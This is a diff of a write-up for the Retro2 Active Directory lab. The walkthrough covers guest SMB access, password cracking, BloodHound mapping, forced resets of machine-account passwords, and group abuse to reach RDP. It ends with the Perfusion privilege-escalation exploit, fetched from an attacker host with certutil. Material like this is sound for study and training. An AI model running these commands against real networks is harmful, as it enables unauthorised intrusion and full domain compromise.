@@ -14,7 +14,7 @@ description: Retro2 is a Windows AD challenge involving guest SMB access to an M
 ## Enumeration
 ### Nmap
 
-We began the engagement by performing a full TCP port scan against the target:
+First, a full TCP port scan was performed against the target:
 
 ```
 sudo nmap -p- -sCV 10.10.127.218 -oA nmap/10.10.127.218-full-tcp
@@ -64,7 +64,7 @@ Host script results:
 
 ```
 
-The scan results indicated that the target was a Windows Server 2008 R2 Domain Controller named **BLN01.retro2.vl**.
+The scan results identified the host as a Windows Server 2008 R2 Datacenter SP1 Domain Controller named `BLN01.retro2.vl`.
 
 Key exposed services included:
 - Kerberos (88)
@@ -80,7 +80,7 @@ The SMB OS discovery script confirmed:
 
 ### SMB
 
-We enumerated SMB shares using guest access:
+SMB shares were enumerated using guest access:
 
 ```bash
 nxc smb 10.10.127.218 -u 'Guest' -p '' --shares
@@ -88,11 +88,11 @@ nxc smb 10.10.127.218 -u 'Guest' -p '' --shares
 
 ![](Pasted%20image%2020260216112103.png)
 
-A share named **Public** was readable.
+A share named `Public` was accessible with read permissions.
 
 ## FootHold
 
-Inside the share, we found a Microsoft Access database file (staff.accdb) and downloaded it for offline analysis.
+Inside the share, a Microsoft Access database file (staff.accdb) was identified and downloaded for offline analysis.
 
 ```bash
 smbclient //10.10.127.218/Public -U "Guest"
@@ -102,11 +102,11 @@ smbclient //10.10.127.218/Public -U "Guest"
 
 ### Cracking the Access Database
 
-The file was password-protected.
+The database file was password-protected.
 
 ![](Pasted%20image%2020260215154847.png)
 
-We extracted the password hash and then performed a dictionary attack using John the Ripper::
+The password hash was extracted and then a dictionary attack was performed using John the Ripper::
 
 ```bash
 office2john staff.accdb > accdbfile.hash
@@ -118,39 +118,37 @@ john --wordlist=/usr/share/wordlists/rockyou.txt accdbfile.hash
 
 ![](Pasted%20image%2020260215154918.png)
 
-After cracking the password, we opened the database and inspected the embedded VBA macro.
-
-The VBA code contained hardcoded domain credentials:
+After successfully cracking the password, the database was opened and hardcoded domain credentials were found embedded on a VBA macro.
 
 ![](Pasted%20image%2020260215155038.png)
 
 ### LDAP and BloodHound Enumeration
 
-We validated the credentials:
+The recovered credentials were validated:
 
 ```bash
-nxc smb 10.10.127.218 -u 'ldapreader' -p 'ppYaVcB5R' --shares
+nxc smb 10.10.127.218 -u 'ldapreader' -p '<password>' --shares
 ```
 
 ![](Pasted%20image%2020260216112748.png)
 
-Then collected data for BloodHound:
+Since the credentials were valid, Active Directory data was collected for further analysis using BloodHound.
 
 ```bash
-nxc ldap 10.10.127.218 -d retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --bloodhound --dns-server 10.10.127.218 -c All
+nxc ldap 10.10.127.218 -d retro2.vl -u 'ldapreader' -p '<password>' --bloodhound --dns-server 10.10.127.218 -c All
 ```
 
 ![](Pasted%20image%2020260216112914.png)
 
-BloodHound analysis revealed three domain computer accounts.
+The analysis revealed three domain computer accounts.
 
 ![](Pasted%20image%2020260215233338.png)
 
-The analysis revealed that the machine account FS01$ had permissions over ADMWS01$:
-- GenericWrite
-- ForceChangePassword
+It was identified that the machine account `FS01$` had ForceChangePassword rights over `ADMWS01$`.
 
-This is dangerous because ForceChangePassword allows resetting the target account password without knowledge of the current password being required. Basically, this gives full control over the target machine account if we get access to one of the FS0X computer accounts which was an easy task because both of them had the machine name as password:
+This permission is critical because it allows resetting the target account’s password without knowledge of the current password. If access to one of the FS0X machine accounts is obtained, full control over the target machine account becomes possible.
+
+Both `FS0X` machine accounts were configured with their machine names as passwords, which allowed authentication using:
 
 ```bash
 nxc smb 10.10.127.218 -d retro2.vl -u 'fs01$' -p 'fs01'
@@ -164,7 +162,9 @@ nxc smb 10.10.127.218 -d retro2.vl -u 'fs01$' -p 'fs01'
 > 10.10.127.218   retro2.vl BLN01.retro2.vl
 > ```
 
-The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the domain controller. This is typical of pre-created computer accounts. In this case, we reset the password for FS01:
+The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the domain controller. This is typical of pre-created computer accounts. 
+
+To resolve this, the password for `FS01$` was reset:
 
 ```bash
 impacket-changepasswd 'retro2.vl/fs01$':'fs01'@retro2.vl -newpass Pa55w0rd -dc-ip BLN01.retro2.vl -p rpc-samr
@@ -172,11 +172,17 @@ impacket-changepasswd 'retro2.vl/fs01$':'fs01'@retro2.vl -newpass Pa55w0rd -dc-i
 
 ![](Pasted%20image%2020260216123826.png)
 
-Next, the computer was marked as Owned in BloodHound. Using the “Shortest Paths from Owned Objects” query, we identified that FS01 had ForceChangePassword rights over ADMWS01. ADMWS01, in turn, had AddSelf privileges on the Services group, which was also a member of the Remote Desktop Users group.
+After resetting the password, the FS01$ account was marked as Owned in BloodHound.
+Using the “Shortest Paths from Owned Objects” query, it was identified that:
+
+- `FS01$` had ForceChangePassword rights over `ADMWS01$`.
+- `ADMWS01$` had AddSelf privileges on the Services group.
+- The Services group was a member of the Remote Desktop Users group.
+
 
 ![](Pasted%20image%2020260216114404.png)
 
-Using the privileges identified, we forced a password change for ADMWS01$:
+Using the identified privileges, the password for `ADMWS01$` was reset using:
 
 ```bash
 net rpc password 'ADMWS01$' Pa55w0rd -U retro2.vl/'fs01$' -S BLN01.retro2.vl
@@ -184,15 +190,18 @@ net rpc password 'ADMWS01$' Pa55w0rd -U retro2.vl/'fs01$' -S BLN01.retro2.vl
 
 ![](Pasted%20image%2020260216124005.png)
 
-And then, with the new credentials, we leveraged the compromised `ADMWS01$` account to add the "ldapreader" user to the **Services** group:
+And then, using the newly compromised ADMWS01$ account, the ldapreader user was added to the Services group::
 
 ```bash
 net rpc group addmem "Services" "ldapreader" -S BLN01.retro2.vl -U retro2.vl/'ADMWS01$'
+
+# OR WITH BloodyAD
+bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'Rogue1' add groupMember 'SERVICES' 'ldapreader'
 ```
 
 ![](Pasted%20image%2020260216133532.png)
 
-We verified group membership of the ldapreader user:
+Group membership was verified using:
 
 ```
 ldapsearch -x -H ldap://10.10.127.218 \
@@ -203,7 +212,9 @@ ldapsearch -x -H ldap://10.10.127.218 \
 
 ![](Pasted%20image%2020260216134207.png)
 
-At this point, the user had access to the server via RDP, so we connected using Remmina. It was necessary to set the TLS security level to 0; otherwise, the connection would fail.
+At this stage, the ldapreader user had effective membership in the Remote Desktop Users group.
+
+RDP access to the server was established using Remmina. The TLS security level had to be set to 0; otherwise, the connection would fail.
 
 ![](Pasted%20image%2020260216134959.png)
 
@@ -213,26 +224,27 @@ At this point, the user had access to the server via RDP, so we connected using 
 
 ## Privilege escalation
 
-The host was running Windows Server 2008 R2, which is vulnerable to a privilege escalation issue involving improper permissions on the RPC Endpoint Mapper registry key, as described in the following research:
-- Perfusion
-- Windows Registry RpcEptMapper EoP research by itm4n
+The host was running Windows Server 2008 R2, which is vulnerable to a privilege escalation vulnerability involving improper permissions on the RpcEptMapper registry key, as described in the following blog:
+
+- [Windows Registry RpcEptMapper EoP research by itm4n](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+- https://github.com/itm4n/Perfusion
 
 This vulnerability enables privilege escalation to **NT AUTHORITY\SYSTEM** by:
 - Manipulating the `RpcEptMapper` registry key
 - Triggering controlled DLL loading behavior
 
-First, we downloaded and opened the project in Visual Studio.
+First, the github repository was downloaded and opened in Visual Studio.
 
 > [!NOTE]
-> If you are using a newer versión than 2019 you will need to install some packages.
+> If using a Visual Studio version newer than 2019, additional packages must be installed to successfully build the project.
 
 ![](Pasted%20image%2020260216153804.png)
 
-Compiled the project.
+The project was compiled, producing Perfusion.exe.
 
 ![](Pasted%20image%2020260216154825.png)
 
-And finally we uploaded and executed the exploit to spawn a SYSTEM shell session:
+And finally the binary was uploaded to the target and executed to spawn a SYSTEM shell session:
 
 ```bash
 certutil.exe -urlcache -f http://10.8.8.46/Perfusion.exe Perfusion.exe
